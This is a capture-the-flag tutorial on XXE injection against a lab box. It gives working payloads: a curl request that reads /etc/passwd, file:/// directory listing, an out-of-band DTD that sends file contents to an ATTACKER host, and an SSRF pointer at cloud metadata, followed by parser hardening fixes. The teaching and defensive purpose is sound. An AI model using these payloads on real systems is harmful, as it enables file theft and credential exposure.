# Masterclass: XXE (XML External Entity) Injection, the RELIC SOCIETY File Read, From Zero

**Companion to:** `relicsociety-xxe-writeup.md`

You came at this box with injection instincts from the dojo command-injection challenge, the right reflex, and it got you to the door. This guide explains the *exact* bug you found: **XXE**. From zero: what XML really is, what entities and DOCTYPEs are, how XXE turns "parse my data" into "read your files," why your `&&` test errored, how to work around the XML-character limitation (directory listing), how to fingerprint the parser, the OOB variant for when output isn't reflected, and the fixes.

---

## How to read this

- **Part 0**, XML, DTDs, and **entities** (the feature that gets abused).
- **Part 1**, how injection instincts map onto XXE (and why `&&` broke it).
- **Part 2**, the vulnerability: external entities + reflected output.
- **Part 3**, exploiting it (file read), and the XML-character limitation.
- **Part 4**, directory listing + parser fingerprinting (how we found the Java `app.jar` and the random flag name).
- **Part 5**, blind/OOB XXE (when there's no reflection).
- **Part 6**, the fixes.
- **Glossary**.

---

# PART 0, XML, DTDs, and Entities

**XML** is a way to structure data with tags: `<user><id>1</id></user>`. A server that accepts XML runs it through an **XML parser** that turns the text into a tree.

### Entities, XML's "variables"
An **entity** is a named placeholder the parser expands. You've already used built-in ones: `&amp;` → `&`, `&lt;` → `<`. You can also **declare your own** inside a **DTD** (Document Type Definition), usually in a `<!DOCTYPE …>` block at the top:

```xml
<!DOCTYPE foo [ <!ENTITY hello "world"> ]>
<foo>&hello;</foo>        <!-- parser expands &hello; → world -->
```

### The dangerous kind, *external* entities
An entity can pull its value from an **external resource** via `SYSTEM`:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>          <!-- parser reads the FILE and expands it in -->
```

That's the whole bug surface: if the parser honors `SYSTEM` entities on **input you control**, you can make it **fetch files (or URLs)** and drop the contents wherever `&xxe;` appears. This is **XXE, XML External Entity injection.**

---

# PART 1, Your Injection Instinct, Mapped to XXE

In the dojo box you learned: *find where your input crosses into an interpreter, send a special character, watch it break.* That's exactly what happened here:

- **Reflection:** sending `id=9999` echoed `9999` back → your data reaches the output. (An **oracle**.)
- **The `&&` error:** you read `&&` as a shell operator, but to an **XML parser** `&` begins an **entity reference** (`&name;`). `&&` is an *undefined/malformed* entity → the parser aborts → `Invalid input`.

So the metacharacter that "broke it" is XML's, not the shell's. Same methodology, different interpreter. The lesson: **a breaking metacharacter tells you injection is possible; *which* character breaks it tells you *which interpreter* you're in.**

| Breaking char | Likely interpreter | Bug |
|---|---|---|
| `'` `--` | SQL | SQLi |
| `)` `(` `*` | LDAP | LDAP injection |
| `;` `|` `` ` `` `$()` | OS shell | command injection |
| `&` `<` `<!DOCTYPE` | **XML parser** | **XXE** |
| `{{ }}` | template engine | SSTI |

---

# PART 2, The Vulnerability on This Box

The server takes your XML body and parses it with external entities **enabled**, then reflects the `<id>` back:

```
you send:  <request><id>1</id></request>
server:    parse → look up id → <user><id>1’s account…</id>…</user>
```

Because it (a) **parses your XML**, (b) **resolves `SYSTEM` entities**, and (c) **reflects parsed content**, you can swap your `id` for an entity that reads a file:

```xml
<?xml version="1.0"?>
<!DOCTYPE request [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<request><id>&xxe;</id></request>
```
The parser expands `&xxe;` to the file's bytes, and since `<id>` is echoed, the file comes back to you. **In-band (reflected) XXE.**

---

# PART 3, Exploiting It + the Character Limitation

### 3.1 The file-read primitive
Declare an entity, reference it in a reflected element, read any file the app's user can:
```bash
curl -s -X POST $T/fetch_user -H 'Content-Type: application/xml' --data '<?xml version="1.0"?>
<!DOCTYPE request [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<request><id>&x;</id></request>'
```

### 3.2 Why source code and `/proc/self/environ` failed
The file contents are injected into the response **as XML text**. These characters are **illegal in XML text** and crash the response:
- `<` `>` `&`, structural XML characters (common in source code, HTML, other XML),
- **NUL** and most control bytes (in `/proc/self/{cmdline,environ}`, binaries, `app.jar`).

So **reflected XXE reliably returns only "clean" text**, things like `/etc/passwd`, config lines, and **filenames**. That constraint is *the* thing to internalise; it shapes your next move.

### 3.3 Working around it
- **List directories** (Part 4), filenames are clean.
- **OOB exfiltration** (Part 5), bypasses the reflection entirely; can read anything.
- **PHP target only:** `php://filter/convert.base64-encode/resource=…` returns base64 (clean), not applicable here (Java), but keep it for PHP apps.

---

# PART 4, Directory Listing & Fingerprinting the Parser

### 4.1 `file:///dir/` as a listing oracle
Point the entity at a **directory**:
```xml
<!ENTITY x SYSTEM "file:///">
```
On this box it returned a **list of the directory's files**. That's a **Java** URL-handler behavior (Python's `file://` doesn't list directories). Two payoffs:
1. **Fingerprint:** directory listing ⇒ the XML parser is **Java** ⇒ the real app is **`app.jar`**, despite the `Werkzeug/Python` `Server:` header (a decoy).
2. **Discovery:** filenames are XML-safe, so you can **enumerate the filesystem** even when you can't read source. Listing `/` revealed `flag8b9d5b8e264a.txt`, a **randomized** name you'd never brute-force as `/flag.txt`.

### 4.2 The workflow that cracked it
*Can't read source (special chars)* → *list directories to find a clean, known target* → *read that*. That pivot, **enumerate, don't guess**, is the reusable idea whenever reflected XXE chokes on your first targets.

---

# PART 5, Blind / OOB XXE (for when nothing reflects)

This box reflected output, so we read files directly. When an app parses XML but **doesn't echo** it, you go **out-of-band**: make the parser call *your* server and smuggle the data in the URL. You host a malicious DTD:

**`evil.dtd` (on your server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/log?d=%file;'>">
%eval;
%exfil;
```
**Payload to the target:**
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd"> %dtd; ]>
<r>x</r>
```
The target fetches your DTD, reads the file, and requests `http://ATTACKER/log?d=<file-contents>`, you read it from your web log. (Parameter entities `%` are used because many parsers forbid general-entity tricks in the internal subset.) This also **bypasses the XML-character limit** (contents ride in a URL, often base64'd via a PHP filter or newline-folding). Needs the target to reach your host, doable from EC2 to a public listener.

Other XXE escalations to know: **SSRF** (`SYSTEM "http://169.254.169.254/…"` to hit cloud metadata), and **billion-laughs** DoS (nested entities).

---

# PART 6, The Fixes

**Disable DOCTYPE / external entities**, the one true fix. The parser should refuse `<!DOCTYPE>` on untrusted input. Java (DocumentBuilderFactory):
```java
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);          // best: kill DOCTYPE
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```
(Python: use `defusedxml`; .NET: `XmlResolver = null`; libxml2: `LIBXML_NONET` and no `NOENT`.)

**Defence in depth**
- Don't **reflect** parsed XML back to clients.
- **Validate** inputs before parsing, here, `id` should be an integer; reject anything else (and a DOCTYPE outright).
- Run the app as a low-privileged user in a minimal container so a file-read primitive reaches as little as possible.

---

# Glossary

- **XML parser**, turns XML text into a tree; the interpreter XXE abuses.
- **DTD (Document Type Definition)**, declarations (often in `<!DOCTYPE>`) defining entities/structure.
- **Entity**, a named placeholder the parser expands (`&name;`). **External entity** pulls its value from `SYSTEM "file://…"`/`http://…`.
- **XXE (CWE-611)**, abusing external entities on untrusted XML to read files, SSRF, or DoS.
- **In-band / reflected XXE**, the entity's value appears in the response (this box).
- **Blind / OOB XXE**, no reflection; exfiltrate via a request to an attacker server (parameter entities + external DTD).
- **Parameter entity (`%name;`)**, an entity usable *within* the DTD; key to OOB payloads.
- **`file://` directory listing**, Java URL handler returns a folder's filenames; both a fingerprint and a discovery primitive.
- **SSRF via XXE**, pointing an entity at internal/metadata URLs.

---

# Where to Go Next

- Do the **PortSwigger XXE labs** (file read, SSRF, blind OOB with an external DTD, via `Content-Type` tricks).
- Build a tiny Java service that parses request XML with default `DocumentBuilderFactory`, exploit it, then apply `disallow-doctype-decl` and watch it die.
- Memorise the **character-limitation workarounds**: directory listing, PHP base64 filter (PHP targets), and OOB DTD exfil.
- Keep the habit that solved this: **a breaking metacharacter means injection, then identify the interpreter** (`&`/`<!DOCTYPE` ⇒ XML ⇒ XXE), and **enumerate (list dirs) instead of guessing** when reads are constrained.

The transferable idea: **"parse my input" is as dangerous as "run my input"** when the parser has powerful features (external entities) turned on. XML that reads files is just injection wearing a DTD.
